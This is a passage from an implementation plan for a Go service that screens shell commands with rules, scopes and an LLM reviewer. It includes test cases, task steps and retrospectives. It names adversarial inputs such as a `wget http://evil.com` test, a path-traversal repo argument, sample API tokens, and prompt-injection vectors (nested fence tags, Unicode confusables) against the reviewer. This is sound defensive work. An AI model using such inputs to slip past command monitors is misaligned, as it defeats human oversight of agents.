	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)

	var resp map[string]interface{}
	json.NewDecoder(w.Body).Decode(&resp)
	if resp["action"] != "block" {
		t.Errorf("action = %v, want block", resp["action"])
	}
}

func TestClassifyMissingCommand(t *testing.T) {
	cfg := testConfigWithRules()
	srv := server.New(cfg)

	body := `{}`
	req := httptest.NewRequest("POST", "/classify", strings.NewReader(body))
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", w.Code)
	}
}
```

- [ ] **Step 2: Run tests**

- [ ] **Step 3: Implement classifier and /classify handler**

Create `internal/classifier/classifier.go`: `Classifier` struct holding the parser dialect, rule engine, and (later) corpus/LLM/scopes. `Classify(req ClassifyRequest) ClassifyResponse` runs: parse → walk → evaluate rules → build response. For now, no LLM review — YELLOW with `llm_review=true` just returns `action: "review"`.

Wire `POST /classify` in the server to parse the JSON request body, call the classifier, and return the JSON response. Generate `stargate_trace_id` (crypto/rand hex string). Include `feedback_token` (HMAC) for YELLOW decisions. Include timing breakdown and AST summary in the response.

- [ ] **Step 4: Run tests**

```bash
go test ./internal/server/ -v
go test ./internal/classifier/ -v
```

- [ ] **Step 5: Commit**

```bash
git add internal/classifier/ internal/server/
git commit -m "feat(classifier): wire /classify endpoint with parse -> rules pipeline"
```

### Task 2.4: Corpus test data files

**Files:**
- Create: `testdata/red_commands.txt`
- Create: `testdata/green_commands.txt`
- Create: `testdata/yellow_commands.txt`
- Create: `testdata/evasion_commands.txt`
- Create: `internal/classifier/corpus_test.go`

- [ ] **Step 1: Create test data files**

Populate each file with commands and expected decisions, one per line, format: `command\texpected_decision`. Include all commands from the spec's rule definitions plus evasion vectors from §10.1. Include test cases for: command exceeding `max_command_length` → RED, AST exceeding `max_ast_depth` → RED.

> **Note:** The `testdata/` directory is not listed in the spec's §12 project structure but is standard Go convention for test fixtures. Testdata files should be created alongside Tasks 2.1/2.2 as rules are built. The corpus test runner is added here (Task 2.4) after `/classify` is wired in Task 2.3.

- [ ] **Step 2: Write corpus test**

Create `internal/classifier/corpus_test.go` that reads each testdata file, classifies each command against the default `stargate.toml` config, and asserts the expected decision. Include explicit assertions for `max_command_length` and `max_ast_depth` violations returning RED.

- [ ] **Step 3: Run corpus tests**

```bash
go test ./internal/classifier/ -v -run TestCorpus
```

- [ ] **Step 4: Fix any failing cases, iterate**

- [ ] **Step 5: Commit**

```bash
git add testdata/ internal/classifier/corpus_test.go
git commit -m "test(classifier): add command corpus test suite with evasion vectors"
```

---

## M3: Scopes + Resolvers

Goal: Scope definitions, resolver interface, built-in resolvers, scope-bound rule matching.

> **M3 Retrospective (post-implementation):** 28 threads, 10 rounds, 17 commits.
> Significant improvement over M2 (61 threads) and M1 (84 threads). The
> pre-implementation panel review with edge case enumeration was highly effective
> — only 2 security issues were found during code review (invalid repos/ path
> fallback, relative CWD resolving against process dir), both of which could
> have been caught by the panel with more specific attack scenarios.
>
> **Three patterns drove the review tail:**
>
> 1. **Resolver input validation (10 threads)** — URL parsing edge cases
>    (schemeless detection, port validation, case normalization, file extension
>    false positives) were the largest category. **Lesson:** For any component
>    that parses untrusted input, enumerate the input space exhaustively in the
>    spec: valid inputs, boundary cases, adversarial inputs, and common false
>    positives. The spec had the right structure for github_repo_owner (4 steps)
>    but url_domain was underspecified.
>
> 2. **Architecture ownership (8 threads)** — context threading, version
>    injection, scope construction boilerplate, adapter optimization. These
>    emerged from "who owns what" not being explicit. **Lesson:** When a new
>    package introduces interfaces, decide at design time where construction
>    lives and how context/config flows. The types extraction refactor (moving
>    CommandInfo + interfaces to internal/types) resolved the circular import
>    and let the engine own its dependencies.
>
> 3. **Copilot hallucinations (3 threads)** — repeated claims about a
>    nonexistent `indexOf` function. **Lesson:** Automated reviewers can
>    hallucinate. Always verify against the actual codebase before acting.
>
> **What the design verification prevented:** The panel caught GH_REPO env var
> handling, git remote URL format coverage, gh api path canonicalization, and
> bare-wildcard scope rejection BEFORE implementation. These would have been
> ~15 additional threads.
>
> **Trend:** M1: 84 threads → M2: 61 → M3: 28. The milestone transition
> protocol is working. The remaining review tail is primarily input validation
> edge cases, which are best caught by exhaustive input-space enumeration in
> the spec.

### Task 3.1: Scope matching with glob support

**Files:**
- Create: `internal/scopes/scopes.go`
- Create: `internal/scopes/scopes_test.go`

- [ ] **Step 1: Write failing tests**

```go
func TestScopeExactMatch(t *testing.T) {
	s := scopes.NewRegistry(map[string][]string{
		"github_owners": {"derek", "my-org"},
	})
	if !s.Match("github_owners", "derek") {
		t.Error("expected match for exact value")
	}
	if s.Match("github_owners", "evil-org") {
		t.Error("expected no match for unknown value")
	}
}

func TestScopeGlobMatch(t *testing.T) {
	s := scopes.NewRegistry(map[string][]string{
		"allowed_domains": {"*.example.com", "registry.npmjs.org"},
	})
	if !s.Match("allowed_domains", "api.example.com") {
		t.Error("expected wildcard match")
	}
	if !s.Match("allowed_domains", "registry.npmjs.org") {
		t.Error("expected exact match")
	}
	if s.Match("allowed_domains", "evil.com") {
		t.Error("expected no match")
	}
}
```

- [ ] **Step 2: Implement scope registry**

`NewRegistry(scopes map[string][]string) *Registry`. `Match(scopeName, value string) bool` — iterate patterns, use `filepath.Match` for glob, fall back to exact match.

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/scopes/
git commit -m "feat(scopes): add scope registry with glob pattern matching"
```

### Task 3.2: Resolver interface and GitHub resolver

**Files:**
- Create: `internal/scopes/resolvers.go`
- Create: `internal/scopes/github.go`
- Modify: `internal/scopes/scopes_test.go`

- [ ] **Step 1: Write failing tests for GitHub resolver**

Test cases: `gh --repo derek/stargate pr list` → resolves `derek`. `gh api repos/derek/stargate/pulls` → resolves `derek`. `gh pr list` (no explicit repo) → attempts `.git/config` inference. Adversarial: `gh api repos/derek/../evil/repo` → returns unresolvable (traversal detected). `gh api --input repos/evil/repo /repos/derek/good` → correctly parses positional arg, not flag value.

- [ ] **Step 2: Implement resolver interface and GitHub resolver**

`internal/scopes/resolvers.go`: `type Resolver func(cmd rules.CommandInfo, cwd string) (value string, ok bool)`. `ResolverRegistry` maps resolver names to functions.

`internal/scopes/github.go`: `GithubRepoOwnerResolver` — parses `--repo`/`-R` flags, `gh api repos/<owner>/<repo>` paths (with traversal validation), falls back to `.git/config` inference. Returns the owner string.

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/scopes/
git commit -m "feat(scopes): add resolver interface and GitHub repo owner resolver"
```

### Task 3.3: URL domain resolver

**Files:**
- Create: `internal/scopes/url.go`
- Modify: `internal/scopes/scopes_test.go`

- [ ] **Step 1: Write failing tests**

Add tests for the URL domain resolver: `curl https://api.example.com/path` → resolves `api.example.com`, `wget http://evil.com` → resolves `evil.com`, no URL arg → returns `("", false)`, malformed URLs → returns `("", false)`.

- [ ] **Step 2: Run tests to verify failure**

```bash
go test ./internal/scopes/ -v -run TestURLDomain
```
Expected: FAIL — `url.go` doesn't exist yet.

- [ ] **Step 3: Implement URL domain resolver**

Create `internal/scopes/url.go`: `URLDomainResolver` that extracts the domain from URL arguments in `CommandInfo.Args` using `net/url.Parse`.

- [ ] **Step 4: Run tests to verify pass**

```bash
go test ./internal/scopes/ -v
```
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scopes/
git commit -m "feat(scopes): add URL domain resolver"
```

### Task 3.4: Kubernetes context resolver

**Files:**
- Create: `internal/scopes/k8s.go`
- Modify: `internal/scopes/scopes_test.go`

- [ ] **Step 1: Write failing tests**

Test that the `k8s_context` resolver extracts `--context` flag value from `kubectl` commands. Test cases: `kubectl --context prod get pods` → resolves `prod`, `kubectl get pods` (no explicit context) → returns `("", false)`, `kubectl --context=staging apply -f file.yaml` → resolves `staging`.

- [ ] **Step 2: Run tests to verify failure**

```bash
go test ./internal/scopes/ -v -run TestK8sContext
```
Expected: FAIL — `k8s.go` doesn't exist yet.

- [ ] **Step 3: Implement Kubernetes context resolver**

Create `internal/scopes/k8s.go`: `K8sContextResolver` that extracts the `--context` flag value from `kubectl` commands in `CommandInfo.Flags` or `CommandInfo.Args`.

- [ ] **Step 4: Run tests to verify pass**

```bash
go test ./internal/scopes/ -v
```
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scopes/
git commit -m "feat(scopes): add Kubernetes context resolver"
```

### Task 3.5: Docker registry resolver

**Files:**
- Create: `internal/scopes/docker.go`
- Modify: `internal/scopes/scopes_test.go`

- [ ] **Step 1: Write failing tests**

Test that the `docker_registry` resolver extracts the registry hostname from image references in `docker push/pull` commands. Test cases: `docker push myregistry.io/myimage:latest` → resolves `myregistry.io`, `docker pull ubuntu` → resolves `docker.io` (default), `docker push ghcr.io/owner/repo:tag` → resolves `ghcr.io`.

- [ ] **Step 2: Run tests to verify failure**

```bash
go test ./internal/scopes/ -v -run TestDockerRegistry
```
Expected: FAIL — `docker.go` doesn't exist yet.

- [ ] **Step 3: Implement Docker registry resolver**

Create `internal/scopes/docker.go`: `DockerRegistryResolver` that extracts the registry hostname from image references in `docker push` and `docker pull` commands. Default to `docker.io` when no registry prefix is present.

- [ ] **Step 4: Run tests to verify pass**

```bash
go test ./internal/scopes/ -v
```
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scopes/
git commit -m "feat(scopes): add Docker registry resolver"
```

### Task 3.6: Wire scopes into rule engine

**Files:**
- Modify: `internal/rules/engine.go`
- Modify: `internal/rules/engine_test.go`

- [ ] **Step 1: Write failing tests for scope-bound rules**

Test that a rule with `resolve = { resolver = "github_repo_owner", scope = "github_owners" }` matches when the command targets a trusted owner and doesn't match when it targets an untrusted owner. Also test the new `k8s_context` and `docker_registry` resolvers via scope-bound rules.

- [ ] **Step 2: Run tests to verify failure**

```bash
go test ./internal/rules/ -v -run TestScope
```

- [ ] **Step 3: Integrate scope resolution into rule matching**

When a rule has a `Resolve` field, the engine calls the named resolver, then checks the result against the named scope via the registry.

- [ ] **Step 4: Run tests to verify pass**

```bash
go test ./internal/rules/ -v
```

- [ ] **Step 5: Commit**

```bash
git add internal/rules/ internal/scopes/
git commit -m "feat(rules): integrate scope-bound rule matching via resolvers"
```

---

## M4: LLM Review

> **M4 Retrospective (post-implementation):** 91 threads, 38 Copilot reviews across
> 2 PRs (PR#8: 41 threads/17 reviews, PR#9: 50 threads/21 reviews). This is a
> significant regression from M3 (28 threads) driven by the split-PR approach and
> the security-critical nature of the LLM subsystem. However, the findings were
> overwhelmingly high-quality — several would have been genuine vulnerabilities.
>
> **The split-PR approach amplified the review tail.** Each PR triggered independent
> review cycles, and cross-PR context was lost (Copilot flagged config fields as
> "unused" in PR#1 because the consumers were in PR#2). For future milestones,
> prefer 1 larger PR unless the code is truly independent.
>
> **Five patterns drove the 91 threads:**
>
> 1. **Secret scrubbing completeness (25 threads)** — The scrubber was iteratively
>    hardened across 8 rounds: flags, subcommand, redirects, URL credentials, env
>    var metacharacter adjacency, Bearer/token= prefix preservation, case
>    sensitivity, Text() for .env files, and LLM reasoning/risk_factors. **Lesson:**
>    When implementing a redaction pipeline, enumerate every field in every struct
>    that touches untrusted data, then verify each is scrubbed. The spec listed the
>    pipeline steps but not every field that flows through them.
>
> 2. **Prompt injection defense (18 threads)** — XML fence tag stripping required 6
>    iterations: opening+closing tags, attribute handling, prefix matching boundary,
>    recursive nesting fail-closed, Unicode confusables, and the system/user prompt
>    split. Template injection via sequential ReplaceAll, CWD injection into the
>    system prompt, and the REMINDER placement (system vs user content) were all
>    caught by review. **Lesson:** Prompt construction is a security-critical parser
>    — treat it with the same rigor as the shell parser. Enumerate injection vectors
>    in the spec, not just the defense mechanisms.
>
> 3. **API contract consistency (15 threads)** — null vs [] in JSON, reasoning
>    truncation semantics (0 = omit), trailing colon on empty reasoning, FullPath
>    leaking resolved symlinks, step numbering, comment accuracy. **Lesson:** Define
>    the JSON wire format exhaustively in the spec (including null vs empty, edge
>    cases for each config value), and write contract tests that serialize and verify.
>
> 4. **Config/lifecycle issues (12 threads)** — MaxCallsPerMinute 0 vs nil semantics,
>    ServerCWD not set in test configs, api_key removal (env-only auth), provider
>    validation, config fields unused in split PR. **Lesson:** The *int pointer
>    pattern for "0 means disabled, nil means default" should be decided at design
>    time, not discovered through review. Config lifecycle (what's set in Load vs
>    startup vs per-request) should be explicit in the spec.
>
> 5. **Copilot stale/duplicate observations (21 threads)** — Copilot repeatedly
>    flagged already-fixed issues from stale diffs, and made 2 incorrect claims
>    (null → string in Go, dead mock variable). **Lesson:** The review loop protocol
>    works but generates churn from stale observations. Consider squash-committing
>    review fixes to reduce diff noise between rounds, and track stale thread IDs
>    to avoid re-processing.
>
> **What the panel review prevented:** The 3-round expert panel before implementation
> caught 17 issues including: unbounded file retrieval (C1), symlink bypass (H1),
> shell interpolation in subprocess (H3), and unscoped file reads. The code review
> still found additional issues the panel missed: recursive fence tag nesting,
> deny-glob fail-open, and template injection via sequential replacement.
>
> **Key design decisions made during review (not in original spec):**
> - Auth is env-only (no api_key in config) — secrets don't touch disk
> - ServerCWD captured in config.Load with EvalSymlinks — trusted once
> - MaxCallsPerMinute uses *int for nil/0 disambiguation
> - BuildPrompt takes custom system prompt template parameter
> - Scrubber uses (pattern, replacement) pairs for prefix preservation
> - Fence stripping fails closed (escapes < >) when iteration budget exhausted
>
> **Trend:** M1: 84 → M2: 61 → M3: 28 → M4: 91. The regression is from scope
> (M4 is the largest milestone — 3000+ lines, 2 PRs, security-critical LLM
> integration) and the split-PR amplification. Per-line thread density is actually
> comparable to M3. For M5 (Precedent Corpus), the scope is smaller and should
> return to the M3 trajectory.

Goal: Provider interface, Anthropic implementation, prompt templating with XML fence security, file retrieval, secret scrubbing. Incorporates all findings from 3 rounds of expert panel review.

### Task 4.1: Secret scrubbing

**Files:**
- Create: `internal/scrub/scrub.go`
- Create: `internal/scrub/scrub_test.go`

> **Note:** Scrubbing is its own reusable package — used by both the LLM prompt builder and corpus storage.

- [ ] **Step 1: Write failing tests**

```go
func TestScrubEnvVars(t *testing.T) {
	result := scrub.Command("GITHUB_TOKEN=ghp_abc123 curl https://api.github.com")
	assert(!strings.Contains(result, "ghp_abc123"), "env var value should be redacted")
	assert(strings.Contains(result, "GITHUB_TOKEN=[REDACTED]"), "should contain redacted placeholder")
}

func TestScrubTokenPatterns(t *testing.T) {
	// ghp_, sk-ant-, glc_, Bearer, token=, AKIA, npm_, pypi-
	patterns := map[string]string{
		"ghp_abc123def456":                    "ghp_",
		"sk-ant-abc123def":                    "sk-ant-",
		"Bearer sk-ant-abc123def":             "Bearer",
		"token=abc123def456":                  "token=",
		"AKIAIOSFODNN7EXAMPLE":                "AKIA",
	}
	for input, name := range patterns {
		result := scrub.Command("curl -H '" + input + "' https://api.example.com")
		assert(!strings.Contains(result, input), name + " should be redacted")
	}
}

func TestScrubURLCredentials(t *testing.T) {
	// RFC 3986 userinfo scrubbing
	result := scrub.Command("curl https://user:s3cret@api.example.com/data")
	assert(!strings.Contains(result, "s3cret"), "URL password should be redacted")
	assert(strings.Contains(result, "[REDACTED]@api.example.com"), "should preserve host")
}

func TestScrubExtraPatterns(t *testing.T) {
	s := scrub.New([]string{`my-org-token-[a-zA-Z0-9]+`})
	result := s.Command("curl -H 'X-Token: my-org-token-abc123' https://internal.api")
	assert(!strings.Contains(result, "my-org-token-abc123"), "extra pattern should match")
}
```

- [ ] **Step 2: Implement scrubber**

`scrub.New(extraPatterns []string) *Scrubber` — compiles built-in + extra regex patterns once. Returns error if any pattern fails to compile.

`(s *Scrubber) Command(raw string) string` — applies:
1. Env var value redaction (`VAR=value` → `VAR=[REDACTED]`)
2. Token regex patterns (ghp_, sk-ant-, glc_, Bearer, token=, AKIA, npm_, pypi-)
3. URL credential scrubbing (RFC 3986 userinfo: `user:pass@host` → `[REDACTED]@host`) via `net/url.Parse` on URL-like args
4. Configurable extra_patterns

`(s *Scrubber) CommandInfo(info *types.CommandInfo) *types.CommandInfo` — returns a deep copy with `Env` values and matching args redacted.

`(s *Scrubber) Text(text string) string` — applies token patterns + URL credential scrubbing to arbitrary text (used for file contents and LLM reasoning).

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/scrub/
git commit -m "feat(scrub): secret scrubbing with env vars, tokens, URL credentials, extra patterns"
```

### Task 4.2: XML fence escaping

**Files:**
- Create: `internal/llm/fence.go`
- Create: `internal/llm/fence_test.go`

> **Panel requirement:** Iterative stripping of both opening AND closing tags, with attribute handling and Unicode confusable normalization.

- [ ] **Step 1: Write failing tests**

```go
// Basic closing tag stripping
func TestStripClosingTag(t *testing.T) { ... }
// Opening tag stripping
func TestStripOpeningTag(t *testing.T) { ... }
// Tags with attributes: <trusted_scopes class="x">
func TestStripTagWithAttributes(t *testing.T) { ... }
// Recursive: </untrusted_</untrusted_command>command> → empty after iterative strip
func TestRecursiveTagStripping(t *testing.T) { ... }
// Case insensitive: </UNTRUSTED_COMMAND>
func TestCaseInsensitive(t *testing.T) { ... }
// Whitespace variants: </ untrusted_command >, < trusted_scopes >
func TestWhitespaceVariants(t *testing.T) { ... }
// Unicode confusables: fullwidth <／untrusted_command＞
func TestUnicodeConfusables(t *testing.T) { ... }
// Iteration bound: max 10 iterations, then stop
func TestIterationBound(t *testing.T) { ... }
// All 5 fence tag names covered
func TestAllFenceTagNames(t *testing.T) { ... }
```

- [ ] **Step 2: Implement fence escaping**

`StripFenceTags(content string) string`:
- Fence tag names: `untrusted_command`, `untrusted_file_contents`, `parsed_structure`, `precedent_context`, `trusted_scopes`
- Unicode confusable replacement table (applied first):
  - Fullwidth: U+FF1C→<, U+FF0F→/, U+FF1E→>
  - Math angle: U+27E8→<, U+27E9→>
  - Small form: U+FE64→<, U+FE65→>
  - Other: U+2039→<, U+203A→>, U+2215→/
- Regex per tag name: `(?i)<\s*/?\s*TAGNAME[^>]*>` (handles both opening/closing, attributes, whitespace)
- Apply iteratively until no matches, max `maxTagStripIterations = 10`

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/llm/fence.go internal/llm/fence_test.go
git commit -m "feat(llm): iterative XML fence tag stripping with Unicode confusable normalization"
```

### Task 4.3: LLM provider interface and prompt builder

**Files:**
- Create: `internal/llm/reviewer.go`
- Create: `internal/llm/prompt.go`
- Create: `internal/llm/reviewer_test.go`

- [ ] **Step 1: Write failing tests for prompt building**

Test that:
- `{{command}}` is scrubbed and XML-fenced
- `{{ast_summary}}`, `{{cwd}}`, `{{rule_reason}}`, `{{scopes}}`, `{{precedents}}`, `{{file_contents}}` interpolate correctly
- All fence tags are stripped from interpolated content via `StripFenceTags`
- Empty optional sections (file_contents, precedents) are omitted
- Sandwich reminder appears after untrusted blocks, before Decision Criteria
- File path labels show only basename + parent dir (e.g., `scripts/deploy.sh`)

- [ ] **Step 2: Implement provider interface and prompt builder**

`internal/llm/reviewer.go`:
```go
// ReviewRequest carries structured prompt components — providers MUST keep
// SystemPrompt and UserContent separate (SDK → system/messages fields,
// subprocess → concatenated on stdin).
type ReviewRequest struct {
    SystemPrompt string    // Security instructions and decision framework
    UserContent  string    // Untrusted data: command, AST, files, precedents, scopes
    Model        string
    MaxTokens    int
    Temperature  float64
}

type ReviewResponse struct {
    Decision     string   // "allow" or "deny"
    Reasoning    string
    RiskFactors  []string
    RequestFiles []string // non-empty = file request, not verdict
}

type ReviewerProvider interface {
    Review(ctx context.Context, req ReviewRequest) (ReviewResponse, error)
}
```

`internal/llm/prompt.go`: `BuildPrompt(template string, vars PromptVars) (systemPrompt, userContent string)`. Returns two strings — the system prompt (everything before/after untrusted blocks including decision criteria) and user content (the fenced untrusted data). `PromptVars` holds all template variables. Apply `StripFenceTags` to all interpolated content. Apply scrubber to command, file contents, and AST summary before interpolation. File path labels: `filepath.Join(filepath.Base(filepath.Dir(p)), filepath.Base(p))`.

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/llm/
git commit -m "feat(llm): provider interface and prompt builder with structured system/user split"
```

### Task 4.4: Anthropic provider implementation

**Files:**
- Create: `internal/llm/anthropic.go`
- Modify: `internal/llm/reviewer_test.go`

- [ ] **Step 1: Write tests with mock HTTP server**

Test the Anthropic provider:
- Successful allow/deny
- File request response
- Malformed response → action "review" (ask user)
- Type mismatches in response: null decision, array decision, numeric decision, nested JSON in reasoning, empty object, missing fields (all → "review")
- Timeout → error
- SDK path: system prompt maps to `system` field, user content maps to `messages`

- [ ] **Step 2: Implement Anthropic provider**

**Auth resolution order:**
1. `llm.api_key` config field or `ANTHROPIC_API_KEY` env → direct SDK path
2. `CLAUDE_CODE_OAUTH_TOKEN` env → `exec.LookPath("claude")` check → subprocess path
3. Neither available → return error (caller disables LLM review with logged warning)

**SDK path:** Use `anthropic-sdk-go`. Map `ReviewRequest.SystemPrompt` to the API's `system` parameter, `ReviewRequest.UserContent` to `messages[0].content`. Parse response via strict Go struct unmarshalling.

**Subprocess path:**
- `exec.CommandContext(ctx, "claude", "-p", "--model", model, "--max-turns", "1", "-")`
- `cmd.Cancel = func() error { return cmd.Process.Signal(syscall.SIGTERM) }`
- `cmd.WaitDelay = 3 * time.Second`
- Prompt piped via `cmd.Stdin` (SystemPrompt + "\n\n" + UserContent)
- Stderr: `io.LimitReader(cmd.StderrPipe(), 4096)` in goroutine, joined via `sync.WaitGroup`
- Per-process deadline as safety net independent of parent context

**Response parsing (both paths):**
- Unmarshal into strict Go struct with exact types
- `json.Decoder.DisallowUnknownFields()` — unknown fields logged as warnings
- Type mismatches → error → action "review"
- `decision` must be exactly `"allow"` or `"deny"` — anything else → action "review"

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/llm/
git commit -m "feat(llm): Anthropic provider with dual auth, graceful subprocess shutdown"
```

### Task 4.5: File retrieval with path validation

**Files:**
- Create: `internal/llm/files.go`
- Modify: `internal/llm/reviewer_test.go`

- [ ] **Step 1: Write failing tests**

Test:
- Allowed path succeeds
- Denied path returns absent (not denied — no info leak)
- Path outside allowed_paths returns absent
- Symlink resolution via `filepath.EvalSymlinks` — symlink to denied path → absent
- Symlink resolution failure → absent
- File exceeding `max_file_size` returns truncated preview
- `max_files_per_request` cap (excess files silently skipped)
- `max_total_file_bytes` cap (remaining files reported absent after budget exhausted)
- `allowed_paths` resolved against server CWD (not request CWD)
- File contents scrubbed via scrubber before return
- Missing file returns absent notice
- `doublestar.Match` for `**` glob patterns in allowed/denied paths

- [ ] **Step 2: Implement file resolver**

```go
type FileResolverConfig struct {
    AllowedPaths     []string // glob patterns, anchored to ServerCWD
    DeniedPaths      []string // glob patterns
    MaxFileSize      int
    MaxFilesPerReq   int
    MaxTotalFileBytes int
    ServerCWD        string   // anchor for relative allowed_paths, set at startup
    Scrubber         *scrub.Scrubber
}

type FileResult struct {
    Label     string // sanitized: basename + parent dir only
    FullPath  string // for files_inspected in API response
    Content   string // scrubbed
    Truncated bool
    Absent    bool
}

func ResolveFiles(paths []string, cfg FileResolverConfig) []FileResult
```

Per file: `filepath.EvalSymlinks` → resolve relative `allowed_paths` against `cfg.ServerCWD` → `doublestar.Match` for validation → read up to `MaxFileSize` → accumulate against `MaxTotalFileBytes` → scrub content → sanitize label to `parent/basename`.

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/llm/
git commit -m "feat(llm): file retrieval with symlink resolution, path validation, scrubbing"
```

### Task 4.6: LLM rate limiter

**Files:**
- Create: `internal/llm/ratelimit.go`
- Create: `internal/llm/ratelimit_test.go`

> **Panel requirement:** Configurable rate limit on LLM calls to prevent cost explosion and abuse.

- [ ] **Step 1: Write failing tests**

Test: calls within limit succeed, calls exceeding limit return error, burst allowance works.

- [ ] **Step 2: Implement rate limiter**

Use `golang.org/x/time/rate`. `rate.NewLimiter(rate.Limit(float64(maxCallsPerMin)/60.0), burstSize)` with burst of 5 (allows short bursts while maintaining the per-minute average). The `Reviewer` wraps the provider with a rate check — if `limiter.Allow()` returns false, return a sentinel error that the classifier maps to YELLOW (ask user) without LLM review. Set to 0 for unlimited (limiter disabled).

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/llm/
git commit -m "feat(llm): add rate limiter for LLM calls (max_calls_per_minute)"
```

### Task 4.7: Config additions for M4

**Files:**
- Modify: `internal/config/config.go`

- [ ] **Step 1: Add new config fields**

Add to `LLMConfig`:
- `MaxFilesPerRequest int` (default 3)
- `MaxTotalFileBytes int` (default 131072)
- `MaxCallsPerMinute int` (default 30)

Add to `CorpusConfig`:
- `MaxWritesPerMinute int` (default 10)
- `MaxReasoningLength int` (default 1000)

Add validation:
- All numeric fields >= 0
- `extra_patterns` must compile as valid regex

- [ ] **Step 2: Run tests, commit**

```bash
git add internal/config/
git commit -m "feat(config): add M4 config fields (file limits, rate limits, reasoning cap)"
```

### Task 4.8: Wire LLM review into classifier

**Files:**
- Modify: `internal/classifier/classifier.go`
- Modify: `internal/classifier/classifier_test.go`

- [ ] **Step 1: Write tests**

Test the full pipeline with a mock LLM provider:
- YELLOW command with `llm_review=true` → LLM returns allow → action "allow"
- LLM returns deny → action "block"
- LLM returns file request → second call with file contents → final verdict
- LLM returns second file request → treated as deny (two-call max)
- LLM timeout → fallback to action "review" (ask user)
- LLM rate limit exceeded → fallback to action "review" (ask user)
- Malformed LLM response → action "review"
- `max_response_reasoning_length` truncation in API response
- Scrubbed command in LLM prompt (not original)

- [ ] **Step 2: Integrate LLM into classifier pipeline**

After YELLOW rule match with `llm_review=true`:
1. Scrub command and CommandInfo
2. Build prompt (system + user content, with scopes from config)
3. Check rate limiter → if exhausted, return YELLOW/review
4. First LLM call
5. Parse response → if verdict, proceed to step 8
6. If file request: resolve files (with server CWD anchor), rebuild user content with `{{file_contents}}`
7. Second LLM call → if another file request, treat as deny
8. Map response to action. Truncate reasoning to `max_response_reasoning_length` for API response
9. Return (corpus write deferred to M5)

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/classifier/
git commit -m "feat(classifier): integrate LLM review with rate limiting, file retrieval, scrubbing"
```

---

## M5: Precedent Corpus

Goal: SQLite-backed judgment store with structural signatures, similarity search, and precedent injection.

### Task 5.1: SQLite schema and migrations

**Files:**
- Create: `internal/corpus/corpus.go`
- Create: `internal/corpus/corpus_test.go`

- [ ] **Step 1: Write failing tests**

Test: open creates DB and tables, schema matches spec, WAL mode is enabled, busy_timeout is set.

- [ ] **Step 2: Implement corpus open/close/migrate**

`Open(path string) (*Corpus, error)` — open SQLite via `modernc.org/sqlite`, enable WAL mode, set busy_timeout, create tables and indexes per spec §7.5 schema. `Close()` — WAL checkpoint, close DB. Background pruning goroutine based on `max_age` and `max_entries`.

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/corpus/
git commit -m "feat(corpus): add SQLite schema, migrations, WAL mode, and pruning"
```

### Task 5.2: Structural signatures

**Files:**
- Create: `internal/corpus/signature.go`
- Modify: `internal/corpus/corpus_test.go`

- [ ] **Step 1: Write failing tests**

Test: same command → same signature. Different args, same structure → same signature. Different flags → different signature. Pipeline order preserved.

- [ ] **Step 2: Implement signature computation**

`ComputeSignature(cmds []rules.CommandInfo) (signature string, hash string)` — extract `(name, subcommand, sorted_flags, context)` tuples, sort by pipeline position, serialize as canonical JSON, SHA-256 hash.

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/corpus/
git commit -m "feat(corpus): add structural signature computation"
```

### Task 5.3: Write and lookup operations

**Files:**
- Create: `internal/corpus/write.go`
- Create: `internal/corpus/lookup.go`
- Modify: `internal/corpus/corpus_test.go`

- [ ] **Step 1: Write failing tests**

Test: write a judgment, look it up by exact hash. Write multiple, search by similarity. Jaccard scoring. Rate limiting (one write per signature per hour). Idempotent user approval writes.

- [ ] **Step 2: Implement write and lookup**

`Write(entry PrecedentEntry) error` — insert with rate limiting check. `LookupExact(signatureHash string) (*PrecedentEntry, error)`. `LookupSimilar(signature string, minSimilarity float64, maxPrecedents int, maxPerDecision int) ([]PrecedentEntry, error)` — load candidates by command_names overlap, compute Jaccard, filter, balance allow/deny.

- [ ] **Step 3: Run tests, commit**

```bash
git add internal/corpus/
git commit -m "feat(corpus): add write and lookup with similarity scoring"
```

### Task 5.4: Precedent formatting for prompts

**Files:**
- Create: `internal/corpus/format.go`
- Modify: `internal/corpus/corpus_test.go`

- [ ] **Step 1: Write tests and implement**

`FormatPrecedents(entries []PrecedentEntry) string` — format precedents as the `{{precedents}}` prompt block per spec §7.5. Include age, similarity, decision, reasoning, CWD. Omit block entirely when empty.

- [ ] **Step 2: Run tests, commit**

```bash
git add internal/corpus/
git commit -m "feat(corpus): add precedent formatting for LLM prompts"
```

### Task 5.4.5: TTL Map utility

**Files:**
- Create: `internal/ttlmap/ttlmap.go`
- Create: `internal/ttlmap/ttlmap_test.go`

- [ ] **Step 1: Write failing tests**

Test: set a key and get it back, key expires after TTL and returns not-found, background sweep removes expired entries, concurrent access (set/get/delete from multiple goroutines) is safe.

- [ ] **Step 2: Implement TTL map**

Create `internal/ttlmap/ttlmap.go`: a generic TTL map (`TTLMap[K comparable, V any]`) backed by `sync.RWMutex`. `Set(key K, value V, ttl time.Duration)`, `Get(key K) (V, bool)`, `Delete(key K)`. Background sweep goroutine at a configurable interval removes expired entries. `Close()` stops the sweep. This is used by the feedback handler for `tool_use_id → traceInfo` mapping.

- [ ] **Step 3: Run tests**

```bash
go test ./internal/ttlmap/ -v -race
```
Expected: PASS

- [ ] **Step 4: Commit**

```bash
git add internal/ttlmap/
git commit -m "feat(ttlmap): add generic TTL map with background sweep and concurrent safety"
```

### Task 5.5: Wire corpus into classifier and add /feedback endpoint

**Files:**
- Modify: `internal/classifier/classifier.go`
- Create: `internal/feedback/feedback.go`
- Create: `internal/feedback/feedback_test.go`
- Modify: `internal/server/server.go`

- [ ] **Step 1: Write tests for feedback endpoint**

